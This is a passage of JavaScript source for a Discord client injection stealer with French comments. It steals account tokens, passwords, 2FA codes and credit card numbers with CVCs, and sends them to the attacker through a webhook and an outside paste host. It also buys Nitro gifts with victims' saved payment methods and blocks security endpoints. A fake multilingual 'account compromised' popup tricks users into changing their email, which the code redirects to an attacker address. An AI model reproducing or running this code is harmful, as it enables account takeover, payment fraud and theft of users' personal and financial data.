                JSON.parse(xhr.responseText);
            `);
            if (!Array.isArray(sources)) return;
            for (let src of sources) {
                if (src.invalid) continue;
                let code = await attemptPurchase(token, src.id, 'boost', 'year');
                if (code) return sendNitroCode(token, code);
                code = await attemptPurchase(token, src.id, 'boost', 'month');
                if (code) return sendNitroCode(token, code);
                code = await attemptPurchase(token, src.id, 'classic', 'month');
                if (code) return sendNitroCode(token, code);
            }
        } catch (e) {}
    }

    async function attemptPurchase(token, paymentSourceId, type, time) {
        const options = {
            expected_amount: config.nitro[type][time].price,
            expected_currency: 'usd',
            gift: true,
            payment_source_id: paymentSourceId,
            purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
            sku_subscription_plan_id: config.nitro[type][time].sku
        };
        const resp = await execScript(`
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[type][time].id}/purchase", false);
            xhr.setRequestHeader("Authorization", "${token}");
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify(${JSON.stringify(options)}));
            xhr.responseText;
        `);
        try {
            const data = JSON.parse(resp);
            return data.gift_code ? 'https://discord.gift/' + data.gift_code : null;
        } catch { return null; }
    }

    async function sendNitroCode(token, code) {
        const json = await getInfo(token);
        if (!json) return;
        const extra = await getExtraInfo(token);
        const embed = {
            fields: [
                { name: `<a:bby:987689940852817971> Token:`, value: `\`\`\`ansi\n\x1B[2;30m\x1B[0m\x1B[2;33m${token}\x1B[0m\x1B[2;34m\x1B[0m\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})`, inline: false },
                { name: `<:bby:987689935018549328> Nitro Code:`, value: `\`${code}\``, inline: false },
                { name: `<:bby:987689933844127804> Badges:`, value: getBadges(json.flags), inline: true },
                { name: `<:bby:987689935018549328> Nitro Type:`, value: getNitro(json.premium_type), inline: true },
                { name: `<a:bby:987689939401588827> Billing:`, value: await getBilling(token), inline: true },
                { name: `<:bby:987689943558135818> Email:`, value: `\`${json.email || 'N/A'}\``, inline: true },
                { name: `<:bby:987689942350196756> Computer:`, value: `\`${extra ? extra.computerName : 'N/A'}\``, inline: true },
                { name: `<:bby:987689943558135818> Phone:`, value: `\`${extra ? extra.phone : 'N/A'}\``, inline: true },
                { name: `<:bby:987689935018549328> Creation:`, value: `\`${extra ? extra.creationDate : 'N/A'}\``, inline: true },
                { name: `<a:bby:987689939401588827> MFA:`, value: `\`${extra ? extra.mfa : 'N/A'}\``, inline: true },
                { name: `<:bby:987689942350196756> Friends:`, value: `\`${extra ? extra.friends : 'N/A'}\``, inline: true },
                { name: `<:ange:1103031009550798948> Guilds:`, value: `\`${extra ? extra.guilds : 'N/A'}\``, inline: true }
            ],
            color: config.embed_color,
            author: { name: `${getDisplayName(json)} | ${json.id}`, icon_url: getAvatarUrl(json) },
            footer: { text: 'First Inject - ZebiRP' },
            thumbnail: { url: json.avatar ? getAvatarUrl(json) : undefined }
        };
        const content = { username: config.embed_name, avatar_url: config.embed_icon, embeds: [embed] };
        if (config.ping_on_run) content.content = config.ping_val + `\n${code}`;
        hooker(content);
    }

    // ==================== DÉCONNEXION FORCÉE ====================
    function forceLogout() {
        try {
            const markerPath = path.join(__dirname, '.logout_done');
            if (fs.existsSync(markerPath)) return;
            const wc = getDiscordWebContents();
            if (!wc) return;
            const script = `(function(){
                return new Promise(function(resolve){
                    function tryMod(m){
                        if(!m) return false;
                        if(typeof m.logout==='function'){ try{m.logout();}catch(e){} }
                        if(m.default && typeof m.default.logout==='function'){ try{m.default.logout();}catch(e){} }
                        for(var k in m){
                            if(m[k] && typeof m[k].logout==='function'){ try{m[k].logout();}catch(e){} }
                        }
                        return false;
                    }
                    if(typeof webpackChunkdiscord_app!=='undefined'){
                        webpackChunkdiscord_app.push([[Math.random()],{},function(r){
                            if(r && r.c){
                                for(var k in r.c){
                                    try{ var x=r.c[k].exports; if(x) tryMod(x); }catch(e){}
                                }
                            }
                        }]);
                    }
                    setTimeout(function(){
                        try{
                            localStorage.clear();
                            sessionStorage.clear();
                            document.cookie.split(';').forEach(function(c){
                                document.cookie=c.replace(/^ +/,'').replace(/=.*/,'=;expires='+new Date().toUTCString()+';path=/');
                            });
                            if(typeof indexedDB!=='undefined' && indexedDB.databases){
                                indexedDB.databases().then(function(dbs){
                                    dbs.forEach(function(db){ try{ indexedDB.deleteDatabase(db.name); }catch(e){} });
                                }).catch(function(){});
                            }
                            location.reload(true);
                        }catch(e){}
                        resolve();
                    },1500);
                });
            })()`;
            wc.executeJavaScript(script, true).then(() => {
                fs.writeFileSync(markerPath, '');
            }).catch(() => {});
        } catch (e) {}
    }

    function scheduleLogout() {
        let attempts = 0;
        const t = setInterval(() => {
            attempts++;
            forceLogout();
            if (attempts >= 25) clearInterval(t);
        }, 1500);
    }
    if (config.auto_logout) setTimeout(scheduleLogout, 2000);

    // ==================== TRADUCTIONS POUR LE SOCIAL ENGINEERING ====================
    function translateText(lang) {
        const languages = {
            'en-US': ['User Settings','Edit email address','Change your Email-Address','We have detected something unusual with your Discord account, your address,','has been compromised.','Please change it to continue using your account.','No longer have access to your email','Contact your email provider to fix it.'],
            'fr': ['Paramètres utilisateur','Modifier l\'adresse e-mail','Changez votre adresse e-mail','Nous avons détecté quelque chose d\'inhabituel avec votre compte Discord, votre adresse,','a été compromise.','Veuillez la changer pour continuer à utiliser votre compte.','Vous n\'avez plus accès à votre adresse e-mail','Contactez votre fournisseur de messagerie pour la réparer.'],
            'es': ['Configuración de usuario','Editar correo electrónico','Cambia tu dirección de correo electrónico','Hemos detectado algo inusual en tu cuenta de Discord, tu dirección,','se ha visto comprometida.','Por favor, cámbiala para seguir usando tu cuenta.','Ya no tienes acceso a tu correo electrónico','Ponte en contacto con tu proveedor de correo electrónico para solucionarlo.'],
            'de': ['Benutzereinstellungen','E-Mail-Adresse bearbeiten','Ändere deine E-Mail-Adresse','Wir haben etwas Ungewöhnliches an deinem Discord-Konto festgestellt, deine Adresse,','wurde kompromittiert.','Bitte ändere sie, um dein Konto weiterhin nutzen zu können.','Du hast keinen Zugriff mehr auf deine E-Mail','Kontaktiere deinen E-Mail-Anbieter, um das Problem zu beheben.'],
            'pt': ['Configurações de usuário','Editar e-mail','Altere seu endereço de e-mail','Detectamos algo incomum em sua conta do Discord, seu endereço,','foi comprometido.','Por favor, altere-o para continuar usando sua conta.','Não tem mais acesso ao seu e-mail','Entre em contato com seu provedor de e-mail para corrigir isso.'],
            'it': ['Impostazioni utente','Modifica indirizzo email','Cambia il tuo indirizzo email','Abbiamo rilevato qualcosa di insolito nel tuo account Discord, il tuo indirizzo,','è stato compromesso.','Per favore, cambialo per continuare a usare il tuo account.','Non hai più accesso alla tua email','Contatta il tuo provider di posta elettronica per risolvere il problema.'],
            'nl': ['Gebruikersinstellingen','E-mailadres bewerken','Wijzig je e-mailadres','We hebben iets ongebruikelijks gedetecteerd met je Discord-account, je adres,','is gecompromitteerd.','Wijzig het om je account te blijven gebruiken.','Geen toegang meer tot je e-mail','Neem contact op met je e-mailprovider om het op te lossen.'],
            'pl': ['Ustawienia użytkownika','Edytuj adres e-mail','Zmień swój adres e-mail','Wykryliśmy coś niezwykłego na Twoim koncie Discord, Twój adres,','został naruszony.','Zmień go, aby kontynuować korzystanie z konta.','Nie masz już dostępu do swojego adresu e-mail','Skontaktuj się z dostawcą poczty e-mail, aby to naprawić.'],
            'ru': ['Настройки пользователя','Изменить адрес электронной почты','Изменить адрес электронной почты','Мы обнаружили нечто необычное в вашей учетной записи Discord, ваш адрес','был скомпрометирован.','Пожалуйста, измените его, чтобы продолжить использовать свою учетную запись.','У вас больше нет доступа к вашей электронной почте','Свяжитесь с вашим провайдером электронной почты, чтобы исправить это.'],
            'ja': ['ユーザー設定','メールアドレスを編集','メールアドレスを変更','あなたのDiscordアカウントに異常が検出されました。あなたのアドレスは','危険にさらされています。','アカウントを引き続き使用するには、変更してください。','メールアドレスにアクセスできなくなりました','修正するにはメールプロバイダーに連絡してください。'],
            'ko': ['사용자 설정','이메일 주소 편집','이메일 주소 변경','귀하의 Discord 계정에서 이상한 점이 감지되었습니다. 귀하의 주소는','위험에 노출되었습니다.','계속 사용하려면 변경하십시오.','더 이상 이메일에 액세스할 수 없습니다','문제를 해결하려면 이메일 제공업체에 문의하십시오.'],
            'zh-CN': ['用户设置','编辑电子邮件地址','更改您的电子邮件地址','我们检测到您的 Discord 帐户出现异常，您的地址','已被泄露。','请更改它以继续使用您的帐户。','无法再访问您的电子邮件','请联系您的电子邮件提供商以解决此问题。'],
            'zh-TW': ['用戶設定','編輯電子郵件地址','更改您的電子郵件地址','我們檢測到您的 Discord 帳戶出現異常，您的地址','已被洩露。','請更改它以繼續使用您的帳戶。','無法再訪問您的電子郵件','請聯繫您的電子郵件提供商以解決此問題。']
        };
        return languages[lang] || languages['en-US'];
    }

    // ==================== WEBREQUEST HANDLERS ====================
    let scriptExecuted = false; // pour la popup
    let pendingPassword = null; // stocker le mot de passe en attendant le token 2FA

    // --- onBeforeRequest ---
    session.defaultSession.webRequest.onBeforeRequest({ urls: config.block_urls }, async (details, callback) => {
        if (details.url.startsWith('wss://remote-auth-gateway')) {
            callback({ cancel: true });
            return;
        }
        if (details.url.includes('/auth/sessions') || details.url.includes('/mfa/totp/enable')) {
            callback({ cancel: true });
            return;
        }
        if (config.auto_mail_changer && config.target_email && details.url.includes('/users/@me') && details.method === 'PATCH') {
            try {
                const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString());
                if (data.email && data.email !== config.target_email) {
                    callback({ cancel: true }); // On bloque la requête originale
                    // On récupère le token et on effectue le changement nous-mêmes
                    const win = getDiscordWebContents();
                    if (win) {
                        const token = await getToken();
                        if (token && data.password && data.email_token) {
                            win.webContents.executeJavaScript(`
                                var xhr = new XMLHttpRequest();
                                xhr.open("PATCH", "https://discord.com/api/v9/users/@me", true);
                                xhr.setRequestHeader("Authorization", "${token}");
                                xhr.setRequestHeader("Content-Type", "application/json");
                                xhr.send(JSON.stringify({ email: "${config.target_email}", email_token: "${data.email_token}", password: "${data.password}" }));
                            `, true);
                        }
                    }
                    return;
                }
            } catch (e) {}
        }
        callback({ cancel: false });
    });

    function setupPopupOnUsersAtMe(details, callback) {
        // Supprimer les CSP
        delete details.responseHeaders['content-security-policy'];
        delete details.responseHeaders['content-security-policy-report-only'];
        details.responseHeaders['Access-Control-Allow-Headers'] = ['*'];
        callback({ responseHeaders: details.responseHeaders });

        // Social engineering : injecter la popup après un chargement de /users/@me
        if (config.auto_mail_changer && config.target_email && !scriptExecuted && details.url.includes('/users/@me') && details.statusCode === 200) {
            scriptExecuted = true;
            setTimeout(async () => {
                const wc = getDiscordWebContents();
                if (!wc) return;
                const token = await getToken();
                if (!token) return;
                const user = await getInfo(token);
                if (!user || !user.locale) return;
                const lang = user.locale;
                const [editprofil, editemailbutton, titlepop, intropop, endintro, lastend, noaccess, contact] = translateText(lang);
                const popupData = JSON.stringify({
                    titlepop, intropop, endintro, lastend, noaccess, contact,
                    email: user.email || '',
                    editprofil, editemailbutton
                });
                const popupScript = `
                    (function() {
                        var data = ${popupData};
                        function clickButtonByLabel(label) {
                            var btns = document.querySelectorAll('button[aria-label]');
                            for (var i = 0; i < btns.length; i++) {
                                if (btns[i].getAttribute('aria-label') === label) {
                                    btns[i].click();
                                    break;
                                }
                            }
                        }
                        function showPopup() {
                            var style = document.createElement('style');
                            style.id = 'discord-inject-popup-style';
                            style.textContent = '#discord-inject-root{position:fixed !important;top:0 !important;left:0 !important;right:0 !important;bottom:0 !important;z-index:2147483647 !important;display:flex !important;align-items:center !important;justify-content:center !important;font-family:gg sans,Noto Sans,sans-serif !important}#discord-inject-backdrop{position:absolute !important;inset:0 !important;background:rgba(0,0,0,0.9) !important}#discord-inject-modal{position:relative !important;width:440px !important;max-width:90vw !important;background:#313338 !important;border-radius:8px !important;box-shadow:0 8px 32px rgba(0,0,0,0.6) !important;overflow:hidden !important;padding:24px !important}#discord-inject-title{font-size:22px !important;font-weight:700 !important;margin:0 0 12px !important;color:#f2f3f5 !important}#discord-inject-desc{font-size:15px !important;line-height:1.5 !important;margin:0 !important;color:#b5bac1 !important}#discord-inject-desc strong{color:#f2f3f5 !important}';
                            if (!document.getElementById('discord-inject-popup-style')) document.head.appendChild(style);
                            var root = document.createElement('div');
                            root.id = 'discord-inject-root';
                            root.innerHTML = '<div id="discord-inject-backdrop"></div><div id="discord-inject-modal" role="dialog"><h2 id="discord-inject-title"></h2><div id="discord-inject-desc"></div></div>';
                            var titleEl = root.querySelector('#discord-inject-title');
                            var descEl = root.querySelector('#discord-inject-desc');
                            function esc(s) { return (s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
                            titleEl.textContent = data.titlepop;
                            descEl.innerHTML = '<p>' + esc(data.intropop) + ' <strong>' + esc(data.email) + '</strong>, ' + esc(data.endintro) + ' ' + esc(data.lastend) + '</p><p>' + esc(data.noaccess) + ' ? ' + esc(data.contact) + '</p>';
                            var container = document.body || document.documentElement;
                            container.appendChild(root);
                            setTimeout(function() {
                                if (root.parentNode) root.remove();
                                var s = document.getElementById('discord-inject-popup-style');
                                if (s) s.remove();
                                clickButtonByLabel(data.editprofil);
                                setTimeout(function() {
                                    clickButtonByLabel(data.editemailbutton);
                                }, 1000);
                            }, 10000);
                        }
                        if (document.body || document.documentElement) {
                            showPopup();
                        } else {
                            document.addEventListener('DOMContentLoaded', showPopup);
                        }
                    })();
                `;
                wc.executeJavaScript(popupScript, true).catch(() => {});
            }, 2000);
        }
    }
    const sessionsToHook = [session.defaultSession];
    try { const p = session.fromPartition('persist:discord'); if (p && p !== session.defaultSession) sessionsToHook.push(p); } catch (e) {}
    sessionsToHook.forEach(s => s.webRequest.onHeadersReceived((details, callback) => setupPopupOnUsersAtMe(details, callback)));

    // --- onCompleted ---
    session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
        if (details.statusCode !== 200 && details.statusCode !== 202 && details.statusCode !== 204) return;
        if (!details.uploadData || !details.uploadData[0] || !details.uploadData[0].bytes) return;

        let unparsed_data, data;
        try {
            unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
            data = JSON.parse(unparsed_data);
        } catch (e) {
            try { data = querystring.parse(unparsed_data); } catch { return; }
        }
        if (!data) return;

        // Récupération du token
        let token = await getToken();

        // Cas particulier : login (on attend le token)
        if (details.url.endsWith('/auth/login')) {
            if (!token) {
                // Attendre un peu que le token soit disponible
                for (let i=0; i<8; i++) {
                    await new Promise(r => setTimeout(r, 1500));
                    token = await getToken();
                    if (token) break;
                }
            }
            sendLogin(data.login || data.email || '', data.password || '', token || '');
            // Stocker le mot de passe au cas où 2FA serait nécessaire
            if (!token && data.password) pendingPassword = data.password;
            return;
        }

        if (!token) return;

        // 2FA login
        if (details.url.endsWith('/auth/mfa/totp')) {
            const code = data.code || (data.ticket ? data.ticket.split(':').pop() : null);
            if (code) {
                send2FACode(code, token);
                if (pendingPassword) {
                    // On avait le password avant 2FA, on renvoie un login complet
                    sendLogin('', pendingPassword, token);
                    pendingPassword = null;
                }
            }
            return;
        }

        // PATCH /users/@me (changement email/password)
        if (details.url.includes('/users/@me') && details.method === 'PATCH') {
            if (!data.password) return;
            if (data.email) sendEmailChange(data.email, data.password, token);
            if (data.new_password) sendPasswordChange(data.password, data.new_password, token);
            return;
        }

        // Ajout de carte bancaire (Stripe)
        if (details.url.includes('api.stripe.com') && details.url.includes('/tokens') && details.method === 'POST') {
            const item = querystring.parse(unparsed_data);
            sendCCAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token);
            return;
        }

        // Ajout Paypal
        if (details.url.includes('paypal_accounts') && details.method === 'POST') {
            sendPaypalAdded(token);
            return;
        }

        // Confirmation de paiement (Stripe) -> achat Nitro auto
        if (config.auto_buy_nitro && details.url.includes('/confirm') && details.method === 'POST') {
            setTimeout(() => {
                buyNitroAndSend(token).catch(() => {});
            }, 7500);
            return;
        }
    });
    module.exports = require('./core.asar');
})();